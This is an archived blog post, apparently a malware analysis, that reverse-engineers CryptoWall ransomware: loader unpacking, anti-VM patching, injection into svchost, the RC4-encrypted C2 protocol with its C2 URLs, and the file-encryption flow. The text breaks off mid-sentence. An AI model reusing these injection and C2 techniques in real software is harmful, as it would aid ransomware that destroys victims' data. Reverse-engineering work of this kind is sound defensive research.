{
    "id": "a68f0e9a-f080-4433-a474-a8bcdde35568",
    "created_at": "2023-01-12T14:59:50.473884Z",
    "updated_at": "2025-03-27T02:16:35.068658Z",
    "deleted_at": null,
    "sha1_hash": "f2c8962cb51fb8ef0bf860c2c7ec424e69f1ba21",
    "title": "2020-11-23 - Genetic Analysis of CryptoWall Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-27T22:58:40Z",
    "file_modification_date": "2022-05-27T22:58:40Z",
    "file_size": 4662884,
    "plain_text": "# Genetic Analysis of CryptoWall Ransomware\n\n**[ryancor.medium.com/genetic-analysis-of-cryptowall-ransomware-843f86055c7f](https://ryancor.medium.com/genetic-analysis-of-cryptowall-ransomware-843f86055c7f)**\n\nRyan Cornateanu November 24, 2020\n\n[Ryan Cornateanu](https://ryancor.medium.com/?source=post_page-----843f86055c7f--------------------------------)\n\nNov 23, 2020\n\n\n26 min read\n\nA strain of a Crowti ransomware emerged, the variant known as CryptoWall, was spotted by\nresearchers in early 2013. Ransomware by nature is extraordinarily destructive but this one\nin particular was a bit beyond that. Over the next 2 years, with over 5.25 billion files\nencrypted and 1 million+ systems infected, this virus has definitely made its mark in the pool\nof cyber weapons. Below you can find a list of the top ten infected countries:\n\nSource: Dell Secure Works\nCryptoWall is distinct in that its campaign ID initially gets sent back to their C2 servers for\nverification purposes. The motivation behind these ID’s are to track samples by the loader\nvectors. The one we will be analyzing in our laboratory experiment has the `crypt1 ID that`\nwas first seen around February 26th, 2014. The infection vector is still unknown today but we\nwill be showing how to unpack the loader, and extract the main ransomware file. Some of the\ncontagions have been caused by Drive-by downloads, Cutwail/Upatre, Infinity/Goon exploit\nkit, Magnitude exploit kit, Nuclear exploit kit/Pony Loader, and Gozi/Neverquest.\n\n\n-----\n\n## Initial Analysis\n\nWe will start by providing the hash of the packed loader file:\n\n➜ CryptoWall git:(master) openssl md5 cryptowall.binMD5(cryptowall.bin)=\n```\n47363b94cee907e2b8926c1be61150c7\n\n```\nRunning the `file command on the bin executable, we can confirm that this is a` `PE32`\n```\nexecutable (GUI) Intel 80386, for MS Windows . Similar to the analysis we did on the\n\n```\n[Cozy Bear’s Beacon Loader, we will be using IDA Pro as our flavor of disassembler tools.](https://medium.com/@ryancor/extracting-embedded-payloads-from-malware-aaca8e9aa1a9)\n\nLoading the packed executable into our control flow graph view, it becomes apparent fairly\nquickly that this is packed loader code, and the real CryptoWall code is hiding somewhere\nwithin.\n\nWinMain CFG View\nChecking the resource section of this binary only shows that it has two valid entries; the first\none being a size of `91,740 bytes. Maybe we will get lucky and the hidden PE will be here?`\n\n\n-----\n\nDumped resource section\nUnfortunately not! This looks like some custom base64 encoded data that will hopefully get\nused later somewhere down the line in our dissection of the virus. If we scroll down to the\nend of `WinMain() you’ll notice a jump instruction that points to` `EAX . It will look something`\nlike this in the decompiler view:\n```\nJUMPOUT(eax=decrypted_code_segment);\n\n## Unpacking Binary Loaders\n\n```\nAt this point, we have to open up a debugger, and view this area of code as it is being\nresolved dynamically. What you will want to do is a set a breakpoint at `0x00402dda, which`\nis the location of the `jmp instruction. Once you hit this breakpoint after continuing`\nexecution, you’ll notice `EAX now points to a new segment of code. Dumping` `EAX in the`\ndisassembler will lead you to the 2nd stage loader. Use the debugger’s `step into feature,`\nand our instruction pointer should be safely inside the decrypted loader area.\n\n\n-----\n\n2nd Stage\nLet’s go over what is happening at this stage of the malware. `EBP+var_EA6E gets loaded`\neffectively into `EDX,` `EAX then holds the index count incrementer to follow the next few`\nbytes at data address `302C9AEh .`\n```\n.data:0302CA46  mov   bl, byte ptr (loc_302C9AE - 302C9AEh)[eax].data:0302CA48 \nadd   ebx, esi.data:0302CA4A  mov   [edx], bl\n\n```\nAll this snippet of code is doing is loading bytes from the address mentioned above and\nstoring it at `bl (the lower 8 bits of` `EBX ). The byte from` `bl is then moved into the pointer`\nvalue of `EDX . At the end of this routine` `EBP+var_EA6E will hold a valid address that gets`\ncalled as `EAX (we can see the line highlighted in red in the image above). Stepping into`\n```\nEAX will now bring us to the third stage of the loading process.\n\n```\nA lot is going on at this point; this function has a couple thousand lines of assembly to go\nover, so at this point it’s better we open the decompiler view to see what is happening. After\nresolving some of the strings on the stack, there is some key information that starts to pop up\non the resource section we viewed earlier.\n```\npLockRsrc = GetProcAddress(kernel32, &LockResource);pSizeofResource =\nGetProcAddress(kernel32, &SizeofResource);pLoadResource = GetProcAddress(kernel32,\n&LoadResource);pGetModuleHandle = GetProcAddress(kernel32,\n&GetModuleHandleA);pFindRsrc = GetProcAddress(kernel32, &FindResourceA);pVirtualAlloc\n= GetProcAddress(kernel32, &VirtualAlloc);\n\n```\nThe malware is loading all functions dynamically that have to do with our resource section.\nAfter the data gets loaded into memory, CryptoWall begins its custom base64 decoding\ntechnique and then continues to a decryption method as seen below.\n\n\n-----\n\n[Most of what is happening here can be explained in a decryptor I wrote that resolves the](https://github.com/ryancor/CryptoWall_Analysis/blob/master/decrypt_shellcode_loader.py)\nshellcode from the resource section. If you head over to the python script, you’ll notice the\ncustom base64 decoder is fairly simple. It will use a hardcoded charset, and check to see if\nany of the bytes from the resource section match a byte from the charset; if it is a match, it\nbreaks from the loop. The next character gets subtracted by one and compared to a value of\nzero, if greater, it will take that value and modulate by `256 ; that byte will then get stored in a`\nbuffer array. It will perform this in a loop `89,268 times, as that is the size of the encoded`\nstring inside the resource section.\n\nSecondary to this, another decryption process starts on our recently decoded data from the\n[algorithm above. Looking at the python script again, we can see that hardcoded](https://github.com/ryancor/CryptoWall_Analysis/blob/master/decrypt_shellcode_loader.py#L61) `XOR keys`\nwere extracted in the debugger if you set a breakpoint inside the decryption loop. All that is\nhappening here is each byte is getting decrypted by a rotating three byte key. Once the loop\nis finished, the code will return the address of the decrypted contents, which essentially just\ncontains an address to another subroutine:\n```\nloop:  buffer = *(base_addr + idx) - (*n ^ (&addr + 0xFFE6DF5F + idx));  *\n(base_addr + idx++) = buffer;…Fourth_Stage_Loader = base_addr;return\n(&Fourth_Stage_Loader)(buffer, b64_decoded_str, a1);\n\n```\nThe `base_addr transfers data to another variable that we named` `Fourth_Stage_Loader`\nwhich holds the address of the newest function, and can be used as a caller. If we dump the\naddress at `call dword ptr gs:(loc_1920A1–1920A1h)[eax] into memory, you’ll see`\nbytes that start with a generic x86 function prologue like `55 8b ec 81 . Dump this to a file,`\n[and we can actually emulate this shellcode. In doing so, we don’t have to step through all](https://github.com/ryancor/CryptoWall_Analysis/blob/master/extractions/pe_process_injector_dump.asm)\nthis code in the debugger; instead it will hopefully tell us how to unpack and get to the main\nCryptoWall file.\n\n**Side note: the python script I wrote will automatically decode & decrypt the resource section,**\nand dump it to a bin file by running => `python decrypt_shellcode_loader.py -e .`\n```\n0x1000: push ebp0x1001: mov ebp, esp0x1003: add esp, 0xfffff004....\n\n```\nAn easy way to see what this next stage in the malware’s loader is doing is by using one of\n[my favorite shellcode emulator tools called ScDbg. By using this tool, we can figure out](http://sandsprite.com/blogs/index.php?uid=7&pid=152)\nexactly where we need to set our breakpoints in order to get to the main ransomware file. We\nare going to look for calls such as `VirtualAlloc,` `WriteProcessMemory,`\n```\nCreateProcessA, etc.\n\n```\n\n-----\n\n```\nC:\\> scdbg.exe /s 3200000 /bp WriteProcessMemory /f dump.binLoaded 10587 bytes from\nfile extractions/pe_process_injector_dump.binBreakpoint 0 set at\n7c802213Initialization Complete..Max Steps: 3200000Using base offset: 0x4010004011cf \nGetProcAddress(LoadLibraryA)40165f  GetProcAddress(VirtualAlloc)401c46  \nGetProcAddress(GetCurrentProcessId)401c52  GetCurrentProcessId() = 29...401d46  \nCloseHandle(18be)401f40  VirtualAlloc(base=0, sz=20400) = 6000004021e1\nVirtualAllocEx(pid=1269, base=400000, sz=25000) = 621000 /* Breakpoint 0 hit at:\n7c802213 */ 4021fe WriteProcessMemory(pid=1269, base=400000, buf=600000, sz=400,\nwritten=12fd70) /* Breakpoint 0 hit at: 7c802213 */40224e\nWriteProcessMemory(pid=1269, base=401000, buf=600400, sz=16400, written=12fd70)\n\n```\nInteresting… it looks like the malware is allocating memory to its own process by using\n```\nGetCurrentProcessId() and allocating a large enough space to inject a PE file into itself.\n\n```\nAfter memory allocation, CryptoWall injects the payload file twice, once for the header, and\nthe second time for the rest of the file. If you set a breakpoint at `WriteProcessMemory, and`\ncontinue execution twice, you can dump the second argument ( ECX ) on the stack to see the\nhidden PE file.\n\nThere is an Anti-VM trick along the way in the 3rd stage part of the loader process that needs\n[to be patched in order to hit the injection process, so I wrote an x32Dbg python plugin to help](https://github.com/ryancor/CryptoWall_Analysis/blob/master/EMU_Scripts/Unpacker-x64dbg.py)\nautomate the patching and dumping operation.\n\n## Reversing the Main Crypto Binary\n\nCryptoWall’s entry point starts off by dynamically resolving all imports to obtain all of NTDLL’s\noffsets by using the process environment block.\n\n\n-----\n\nIt will then call a subroutine that is responsible for using the base address of the loaded DLL\nand uses many hardcoded DWORD addresses to locate hundreds of functions.\n\n**Side Note: If you would like to make your life a whole lot easier with resolving the function**\n[names in each subroutine, I made a local type definition for IDA Pro over here. The resolving](https://github.com/ryancor/CryptoWall_Analysis/blob/master/api_names.h)\nimport function table will look a lot cleaner than what you see above:\n\nAfter the function returns, the malware will proceed to generate a unique hash based on your\nsystem information, the resulting string will be MD5 hashed => `DESKTOP-`\n```\nQR18J6QB0CBF8E8Intel64 Family 6 Model 70 Stepping 1, GenuineIntel . After\n\n```\ncomputing the hash, it will setup a handle to an existing named event object with the\nspecified desired access that will be called as\n```\n\\\\BaseNamedObjects\\\\C6B359277232C8E248AFD89C98E96D65 .\n\n```\nThe main engine of the code starts a few routines after the malware checks for system\ninformation, events, anti-vm, and running processes.\n\n\n-----\n\nMost of the time the ransomware will successfully inject its main thread into `svchost and`\nnot `explorer ; so let’s follow that trail. Since this is a 32-bit binary its going to attempt to`\nfind `svchost.exe inside of` `SysWOW64 instead of` `System32 . After successfully locating`\nthe full path, it will create a new thread using the `RtlCreateUserThread() API call. Once`\nthe thread is created, `NtResumeThread() will be used on the process to start the`\n```\nransomware_thread code. Debugging these types of threads can be a little convoluted,\n\n```\nand setting breakpoints doesn’t always work.\n```\n.text:00416F40   ransomware_thread proc near       .text:00416F40  \nstart+86↓o.text:00416F40.text:00416F40   var_14     = dword ptr\n-14h.text:00416F40   var_10     = dword ptr -10h.text:00416F40   var_C   \n= dword ptr -0Ch.text:00416F40   var_8      = dword ptr -8.text:00416F40  \nvar_4      = dword ptr -4.text:00416F40.text:00416F40 000         push \nebp.text:00416F41 004         mov   ebp, esp.text:00416F43 004       \nsub   esp, 14h.text:00416F46 018         call  ResolveImportsFromDLL...\n\n```\nUsing x32Dbg, you can set the `EIP to address` `0x00416F40 since this thread is not`\nresource dependent on any of the other code that has been executed up until this point; this\nthread even utilizes the `ResolveImportsFromDLL function we saw in the beginning of the`\nprogram’s entry point… meaning, the forced instruction pointer jump will not damage the\nintegrity of the ransomware.\n```\nisHandleSet = SetSecurityHandle();if ( isHandleSet && SetupC2String() ){  v8 = 0; \nv6 = 0;  IsSuccess = WhichProcessToInject(&v8, &v6);  if ( IsSuccess )  {  \nIsSuccess = StartThreadFromProcess(-1, InjectedThread,                \n0, 0, 0);   FreeVirtualMemory(v8);  }}\n\n```\nThe thread will go through a series of configurations that involve setting up security\nattributes, MD5 hashing the hostname of the infected system, and then searching to either\ninject new code into `svchost or` `explorer . In order to start a new thread, the function`\n```\nWhichProcessToInject will query the registry path, and check permissions on what key\n\n```\nvalues the malware has access to. Once chosen, the `InjectedThread process will`\nresume. Stepping into that thread, we can see the module size is fairly small.\n```\n.text:00412E80   InjectedThread proc near        ; DATA .text:00412E80  \n.text:00412E80 000         push  ebp.text:00412E81 004         mov \nebp, esp.text:00412E83 004         call  MainInjectedThread.text:00412E88\n004         push  0.text:00412E8A 008         call  \nReturnFunctionName.text:00412E8F 008         mov   eax,\n[eax+0A4h].text:00412E95 008         call  eax.text:00412E97 004      \nxor   eax, eax.text:00412E99 004         pop   ebp.text:00412E9A 000   \nretn.text:00412E9A   InjectedThread endp\n\n```\nAt address `0x00412E83, a subroutine gets called that will bring the malware to start the`\nnext series of functions that involves the C2 server configuration callback, and the encryption\nof files. After the thread is finished executing, `EAX resolves a function at offset` `+0x0A4`\n\n\n-----\n\nwhich will show `RtlExitUserThread being invoked. Once we enter`\n```\nMainInjectedThread, you’ll notice the first function at 0x004011B40 is giving us the first\n\n```\nclue of how the files will be encrypted.\n```\n.text:00411D06 06C         push  0F0000000h.text:00411D0B 070       \npush  1.text:00411D0D 074         lea   edx,\n[ebp+reg_crypt_path].text:00411D10 074         push  edx.text:00411D11 078 \npush  0.text:00411D13 07C         lea   eax, [ebp+var_8].text:00411D16\n07C         push  eax.text:00411D17 080         call  \nReturnFunctionName.text:00411D1C 080         mov   ecx,\n[eax+240h].text:00411D22 080         call  ecx ; CryptAcquireContext\nCryptAcquireContext is used to acquire a handle to a particular key container within a\n\n```\nparticular cryptographic service provider (CSP). In our case, the CSP being used is\n```\nMicrosoft\\Enhanced\\Cryptographic\\Provider\\V1, which coincides with algorithms\n\n```\nsuch as DES, HMAC, MD5, and RSA.\n\nOnce the `CryptoContext is populated, the ransomware will use the MD5 hash created to`\nlabel the victim’s system information and register it as a key path as such →\n```\nsoftware\\\\C6B359277232C8E248AFD89C98E96D65 . The ransom note is processed by a\n\n```\nfew steps. The first step is to generate the TOR addresses which end up resolving four\naddresses: `http[:]//torforall[.]com,` `http[:]//torman2[.]com,`\n```\nhttp[:]//torwoman[.]com, and http[:]//torroadsters[.]com . These DNS records\n\n```\nwill be used later on to inject into the ransomware HTML file. Next, the note gets produced\nby the use of the Win32 API function, `RtlDecompressBuffer, to decompress the data`\nusing `COMPRESSION_FORMAT_LZNT1 . The compressed ransom note can be found in the`\n```\n.data section and consists of 0x52B8 bytes.\n\n```\n\n-----\n\nDecompressing the note is kind of a mess in python as there is no built in function that is\nable to do LZNT1 decompression. You can find the actual call at address `0x004087F3 .`\n```\n.text:004087CF 024         lea   ecx, [ebp+var_8].text:004087D2 024    \npush  ecx.text:004087D3 028         mov   edx, [ebp+arg_4].text:004087D6\n028         push  edx.text:004087D7 02C         mov   eax,\n[ebp+arg_6].text:004087DA 02C         push  eax.text:004087DB 030     \nmov   ecx, [ebp+var_18].text:004087DE 030         push  ecx.text:004087DF\n034         mov   edx, [ebp+var_C].text:004087E2 034         push \nedx.text:004087E3 038         movzx  eax, [ebp+var_12].text:004087E7 038  \npush  eax.text:004087E8 03C         call  \nReturnFunctionName.text:004087ED 03C         mov   ecx,\n[eax+178h].text:004087F3 03C         call  ecx// Decompiled below(*\n(RtlDecompressBuffer))(COMPRESSION_FORMAT_LZNT1,                \nuncompressed_buffer,             UncompressedBufferSize,        \nCompressedBuffer,             CompressedBufferSize,           \nFinalUncompressedSize) )\n\n```\nAfter the function call, `uncompressed_buffer will be a data filled pointer to a caller-`\nallocated buffer (allocated from a paged or non-paged pool) that receives the decompressed\ndata from CompressedBuffer. This parameter is required and cannot be NULL, which is why\nthere is an NtAllocateVirtualMemory() call to this parameter before being passed to\n\n\n-----\n\n[decompression. The script I wrote will grab the compressed data from the PE file, and run a](https://github.com/ryancor/CryptoWall_Analysis/blob/master/decompress_ransomwarenote.py)\n[LZNT1 decompression algorithm then place the buffer in an HTML file. The resulting note will](https://github.com/ryancor/CryptoWall_Analysis/blob/master/decompress_ransomwarenote.py#L30)\nappear on the victims system as such:\n\nOnce the note is decompressed, the HTML fields will be populated with multiple TOR\naddresses at subroutine `sub_00414160() . The note is stored in memory then follows a few`\nmore checks before the malware sends its first C2 POST request. Stepping into\n```\nSendRequestToC2 which is located at 0x00416A50, the first thing we notice is a buffer\n\n```\nbeing allocated 60 bytes of memory.\n```\n.text:00416A77 018         push  3Ch.text:00416A79 01C         call\nAllocateSetMemory.text:00416A7E 01C         add   esp, 4.text:00416A81 018 \nmov   [ebp+campaign_str], eax\n\n```\n[All this information will eventually help us write a proper fake C2 server that will allow us to](https://github.com/ryancor/CryptoWall_Analysis/blob/master/fake_c2_i2p_server.py)\ncommunicate with the ransomware since CryptoWall’s I2P servers are no longer active.\nAround address `0x004052E0, which we labeled` `EncryptData_SendToC2 will be`\nresponsible for taking our generated campaign string and sending it as an initial ping.\n\n\n-----\n\nIf you set a breakpoint at this function, you can see what the parameter contains:\n```\n{1|crypt1|C6B359277232C8E248AFD89C98E96D65} . Once inside this module, you'll notice\n\n```\nthree key functions; one responsible for byte swapping, a key scheduling algorithm, and the\nother doing the actual encryption. The generated RC4 encryption will end up as a hash\nstring:\n```\n85b088216433863bdb490295d5bd997b35998c027ed600c24d05a55cea4cb3deafdf4161e6781d2cd9aa24\n\n## Command & Control Communication\n\n```\nThe malware sets itself up for a POST request to its I2P addresses that cycle between\n```\nproxy1–1–1.i2p & proxy2–2–2.i2p . The way this is done is by using the function at\n0x0040B880 to generate a random seed based on epoch time, and use that to create a\n\n```\nstring that ranges from 11 to 16 bytes. This PRNG (Pseudo-Random Number Generator)\n[string will be used as the POST request’s URI and as the key used in the byte swapping](https://github.com/ryancor/CryptoWall_Analysis/blob/master/fake_c2_i2p_server.py#L56)\nfunction before the RC4 encryption.\n\nTo give us an example, if our generated string results in `tfuzxqh6wf7mng, then after the`\nfunction call, that string will turn into `67ffghmnqtuwxz . That string gets used for a 256-`\ngenerated key scheduling algorithm, and the POST request (I.E., `http://proxy1–1–`\n```\n1.i2p/67ffghmnqtuwxz ). You can find the reverse engineered algorithm here.\n\n```\n\n-----\n\nThe next part will take this byte swapped key, then RC4 encrypt some campaign information\nthat the malware has gathered, which unencrypted, will look like this:\n\n```\n{1|crypt1|C6B359277232C8E248AFD89C98E96D65|0|2|1||55.59.84.254}\n\n```\n\nThis blob consists of the campaign ID, an MD5 hashed unique computer identifier, a CUUID,\nand the victims public IP address. After preparation of this campaign string, the ransomware\nwill begin to resolve the two I2P addresses. Once CryptoWall sends its first ping to the C2\nserver, the malware expects back an RC4 encrypted string, which will contain a public key\nused to encrypt all the files on disk. The malware has the ability to decrypt this string using\nthe same RC4 algorithm from earlier, and will parse the info from this block:\n```\n{216|1pai7ycr7jxqkilp.onion|[pub_key]|US|[unique_id]} . The onion route is for the\n\n```\nransom note, and is a personalized route that the victim can enter using a TOR browser. The\nsite most likely contains further instructions on how to pay the ransom.\n\nSince the C2 servers are no longer active; in order to actually know what our fake C2 server\n**should send back to the malware; the parser logic had to be carefully dissected which is**\nlocated at `0x00405203 .`\n\n\n-----\n\nIn this block, the malware decrypts the data it received from the C2 server. Once decrypted,\nit stores the first byte in `ECX and compares hex value to` `0x7B (char:` `‘{‘ ). Tracing this`\nfunction call to the return value, the string returned back will remove brackets from start to\nend. At memory address `0x00404E69, a DWORD pointer at` `eax+2ch holds our newly`\ndecrypted and somewhat parsed string, that will be checked for a length greater than 0. If the\nbuffer holds weight, we move on over to the final processing of this string routine at\n```\n0x00404B00, that I dubbed ParseC2Data() . This function takes four parameters, char*\ndatain, int datain_size, char *dataout, int dataout_size . The first blob on\ndatain data gets parsed from the first 0x7C (char: ‘|’ ) and extracts the victim id.\nvictim_id = GetXBytesFromC2Data(decrypted_block_data_from_c2, &hex_7c,\n&ptr_to_data_out);\nptr_to_data_out and EAX will now hold an ID number of 216 (we got that number since\n\n```\nwe placed it there in our fake C2). The next block of code will finish the rest of the data:\n\n\n-----\n\n```\nwhile ( victim_id ){  if ( CopyMemoryToAnotherLocation(&some_buffer_to_copy_too,  \n8 * idx + 8) )  {    CopyBlocksofMemory(victim_id,             \n&some_buffer_to_copy_too[2 * idx + 1],             \n&some_buffer_to_copy_too[2 * idx]);    ++idx;    if ( ptr_to_data_out )   \n{      for ( i = 0; *(i + ptr_to_data_out) == 0x7C; ++i )      {     \nif (        CopyMemoryToAnotherLocation(&some_buffer_to_copy_too,       \n8 * idx + 8) )        {          ++v9;          ++idx;   \n}       }     }  }  victim_id = GetXBytesFromC2Data(0, &hex_7c_0,   \n&ptr_to_data_out);  ++v5;  ++v9;}\n\n```\nWhat’s happening here is that by every iteration of the character `‘|’ we grab the next`\nchunk of data and place it in memory into some type structure. The data jumps X amount of\ntimes per loop until it reaches the last `0x7C byte. It will loop a total of four times. After this`\nfunction returns, `dataout will contain a pointer in memory to this local type, which we`\nreversed to look like this:\n```\nstruct _C2ResponseData{  int victim_id;  char *onion_route;  const char*\nszPemPubKey;  char country_code[2];  char unique_id[4];};\n\n```\nShortly after, there is a check to make sure the victim id generated is no greater than 0x3E8\nor that it is not an unsigned value.\n```\nvalue_of_index = CheckID(*(*parsed_data_out->victim_id));if ( value_of_index > 0x3E8\n|| value_of_index == 0xFFFFFFFF )  value_of_index = 0x78;\n\n```\nI believe certain malware will often perform these checks throughout the parsing of the C2\nresponse server to make sure the data being fed back is authentic. Over at `0x00404F35,`\nthere is another check to see how many times it tried to reach the command server. If the\ncheck reaches exactly 3 times then it will move to check if the onion route is valid; all\nCryptoWall variants hardcode the first string index with ascii `‘1’ . If it does not start with`\nthis number, then it will try to reach back again for a different payload. The other anti-tamper\ncheck it makes for the onion route is a CRC32 hash against the payload, if the compressed\nroute does not equal `0x63680E35, the malware will try one last time to compare against the`\nDWORD value of `0x30BBB749 . The variant has two hardcoded 256 byte arrays to which it`\ncompares the encrypted values against. Brute-forcing can take a long time but is possible\n[with a python script that I made here. The checksum is quite simple, it will take each letter of](https://github.com/ryancor/CryptoWall_Analysis/blob/master/tor_site_checksum_finder.py)\nthe site string and logical-XOR against an unsigned value:\n```\ntmp = ord(site[i])) ^ (ret_value & 0xffffff)\n\n```\nIt will take the `tmp value and use it as an index in the hardcoded byte array to perform`\nanother logical-XOR against :\n```\nret_value = bytes_array[tmp*4:(tmp*4)+4] ^ (0xFFFFFFFF >> 8)\n\n```\n[The return value then gets inverted giving us a 4 byte hash to verify against. Now the](https://github.com/ryancor/CryptoWall_Analysis/blob/master/tor_site_checksum_finder.py#L47)\nmalware moves on over to the main thread responsible for encrypting the victims files at\n```\n0x00412988 . The first function call in this thread is from CryptAcquireContextW, and\n\n```\n\n-----\n\nthat will acquire a handle to a particular key container within a CSP. `16 bytes will then be`\nallocated to the stack using VirtualAlloc; which will be the buffer to the original key.\n```\nisDecompressed = CreateTextForRansomwareNote(0, 0, 0);if ( !isRequestSuccess ||\n!isDecompressed ){  remaining_c2_data = 0;  while ( 1 )  {   isRequestSuccess =\nSecondRequestToC2(&rsa_key,                 &rsa_key_size,\n&remaining_c2_data);   if ( isRequestSuccess )     break;   \nsleep(0x1388u);}\n\n```\nOnce the text for the ransom note is decompressed, CryptoWall will place this note as an\nHTML, PNG, and TXT file inside of every directory the virus went through to encrypt\ndocuments. After this point, it will go through another round of requests to the I2P C2 servers\nto request another RSA 2048-bit public key. This key will be the one used for encryption.\nThis strain will do a number of particular hardcoded hash checks on the data it gets back\nfrom the C2.\n\n## Decoding the Key\n\nCryptoWall will use basic Win32 Crypto functions like `CryptStringToBinaryA,`\n```\nCryptDecodeObjectEx, & CryptImportPublicKeyInfo to decode the RSA key returned.\n\n```\nThen it will import the public key information into the provider which then returns a handle of\nthe public key. After importing is finished, all stored data will go into a local type structure like\nthis:\n```\nstruct _KeyData{  char *key;  int key_size;  BYTE *hash_data_1;  BYTE\n*hash_data_2;};// Gets used here at 0x00412B8Cif ( ImportKey_And_EncryptKey(   \ncryptContext,    rsa_key,    rsa_key_size,    OriginalKey->key,   \n&OriginalKey->key_size,    &OriginalKey->hash_data_1,    &OriginalKey>hash_data_2) ){\n\n```\nThe next actions the malware takes is pretty basic for ransomware.. it will loop through every\navailable drive, and use `GetDriveTypeW to determine whether a disk drive is a removable,`\nfixed, CD-ROM, RAM disk, or network drive. In our case, the C drive is the only open drive\nwhich falls under the category of `DRIVE_FIXED . CryptoWall will only check if the drive is`\nCD-ROM because it will not try to spread in that case.\n```\n.text:00412C1B   mov   ecx, [ebp+driver_letter].text:00412C1E   push  \necx.text:00412C1F   call  GetDriveTypeW.text:00412C2C   cmp   eax,\n5.text:00412C2F   jz   skip_drive\nEAX holds the integer value returned from the function call which represents the type of\n\n```\ndrive associated with that number (5 == DRIVE_CDROM). You can find the documentation\n[here.](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew)\n\nThe exciting part is near as we are about to head over to where the malware duplicates the\n[key it retrieved from our fake C2 server at address](https://github.com/ryancor/CryptoWall_Analysis/blob/master/fake_c2_i2p_server.py#L74) `0x00412C7A . What is happening here is`\npretty straight forward, and we can show in pseudo-code:\n\n\n-----\n\n```\nif (OriginalKey)  DuplicatedKey HeapAlloc(16)  if (DuplicatedKey)   \nCryptDuplicateKey(OriginalKey, 0, 0, DuplicatedKey)   memcpy(DuplicatedKey,\nOriginalKey, OrignalKey_size)   CryptDestroyKey(OriginalKey)\n\n```\nEssentially `CryptDuplicateKey is making an exact copy of a key and the state of the key.`\nThe `DuplicatedKey variable ends up becoming a struct as we can see after the function`\ncall at `0x00412C7A, it gets used to store volume information about the drive its currently`\ninfecting.\n```\nGetVolumeInformation(driver_letter, DuplicatedKey + 20);if (\nMoveDriverLetterToDupKeyStruct(driver_letter,  (DuplicatedKey + 16), 0) {  ...\n\n```\nThat is why 24 bytes was used to allocate to the heap when creating this variable instead of\n16. Now we can define our struct from what we know so far:\n```\nstruct _DupKey{  const char *key;  int key_size;  DWORD unknown1;  DWORD\nunknown2;  char *drive_letter;  LPDWORD lpVolumeSerialNumber;  DWORD unknown3;};//\nNow our code looks cleaner from aboveGetVolumeInformation(driver_letter,   \n&DuplicatedKey->lpVolumeSerialNumber);if (\nMoveDriverLetterToDupKeyStruct(driver_letter,   &DuplicatedKey->drive_letter, 0) {\n...\n\n## Encrypting of Files\n\n```\nAfter the malware is finished storing all pertinent information regarding how and where it will\ndo its encryption, CryptoWall moves forward to the main encryption loop at `0x00416780 .`\n\n\n-----\n\nEncryption Loop Control Flow Graph\nAs we can see, the control flow graph is fairly long in this subroutine, but nothing out of the\nordinary when it comes to ransomware. A lot has to be done before encrypting files. At the\nstart of this function, we see an immediate call to `HeapAlloc to allocate 260 bytes of`\nmemory. We can automatically assume this will be used to store the file’s absolute path, as\nWindows OS only allows a max of 260 bytes. Upon success, there is also an allocation of\nvirtual memory with a size of 592 bytes that will later be used as the file buffer contents. Then\nthe API call `FindFirstFileW uses this newly allocated buffer to store the first filename`\nfound on system. The pseudo-code below will explain the flow:\n```\nlpFileName = Allocate260BlockOfMemory(); // HeapAllocif ( lpFileName ){  (*(wcscpy +\n292))(lpFileName, driver_letter);  ...  lpFindFileData = AllocateSetMemory(592); //\nVirtualAlloc  if ( lpFindFileData )  {   hFile = (*(FindFirstFileW + 504))\n(lpFileName, lpFindFileData);   if ( hFile != 0xFFFFFFFF )   {    v29 = 0; \ndo     {     // Continue down to further file actions\n\n```\nBefore the malware opens up the first victim file, it needs to make sure the file and file\nextension themselves are not part of their hardcoded blacklist of bytes. It does this check\nusing a simple CRC-32 hash check. It will take the filename, and extension; compress it\ndown to a DWORD, then compare that DWORD to a list of bytes that live in the `.data`\nsection.\n\n\n-----\n\n[To see how the algorithm works, I reversed it to python code, and wrote my own file checker.](https://github.com/ryancor/CryptoWall_Analysis/blob/master/tor_site_checksum_finder.py#L69)\n\n➜ python tor_site_checksum_finder.py --check-file-ext \"dll\"\n```\n[!] Searching PE sections for compressed .data\n[!] Searching PE sections for compressed extension .data\n[-] '.dll' is not a valid file extension for Cryptowall\n\n```\n➜ python tor_site_checksum_finder.py --check-file-ext \"py\"\n```\n[!] Searching PE sections for compressed .data\n[!] Searching PE sections for compressed extension .data\n[+] '.py' is a valid file extension for Cryptowall\n\n```\nNow we can easily tell what type of files CryptoWall will attack. Obvious extensions like\n```\n.dll, .exe, and .sys is a very common file type for ransomware to avoid.\n\n```\n\n-----\n\nIf the file passes these two checks, then it moves on over to the last part of the equation; the\nactual encryption located at `0x00412260 . We can skip the first few function calls as they`\nare not pertinent to what is about to happen. If you take a look at address `0x00412358,`\nthere is a subroutine that takes in three parameters; a file handle, our DuplicateKeyStruct,\nand a file size. Stepping into the function, we can immediately tell what is happening:\n```\nif(ReadFileA(hFile, lpBuffer,      DuplicateKeyStruct->file_hash_size,     \n&lpNumberOfBytesRead, 0) && lpNumberOfBytesRead) ==  DuplicateKeyStruct>file_hash_size{   if(memcmp(lpBuffer, DuplicateKeyStruct->file_hash,       \nDuplicateKeyStruct->file_hash_size))   {       isCompare = 1;   }}\n\n```\nThe pseudo-code is telling us that if an MD5 hash of the file is present in the header, then its\nalready been encrypted. If this function returns `isCompared to be true, then CryptoWall`\nmoves on to another file and will leave this one alone. If it returns false from the\n```\nCompare16ByteHeader() function call, the malware will append to the file’s extension by\n\n```\nusing a simple algorithm to generate a three lettered string to place at the end. The\ngeneration takes a timestamp, uses it as a seed, and takes that seed to then mod the first\nthree bytes by 26 then added to 97.\n```\n*(v8 + 2 * i) = DataSizeBasedOnSeed(0, 0x3E8u) % 26 + 97;\n\n```\nThis is essentially a rotation cipher, where you have a numerical variable checked by a\nmodulate to ensure it doesn’t go past alphanumeric values, then the addition to 97 rotates\nthe ordinal 45 times. As an example, if we have the letter `‘A’, then after this cipher, it ends`\nup becoming an `’n’ . In conclusion, if the victim file is named` `hello.py, this subroutine`\nwill rename it to `hello.py.3xy .`\n\nNext, around address `0x004123F0, the generation of an AES-256 key begins with another`\ncall to Win32’s `CryptAcquireContextW . The` `phProv handler gets passed over to be`\nused in `CryptGenKey and` `CryptGetKeyParam .`\n```\nif ( CryptGenKey(hProv, 0x6610, 1, &hKey) ):  pbData_1 = 0;  pdwDataLen_1 = 4;  \nif ( CryptGetKeyParam(hKey, 8, &pbData_1, &pdwDataLen_1, 0, 4)\n\n```\n\n-----\n\nThe hexadecimal value of `0x6610 shown above tells us that 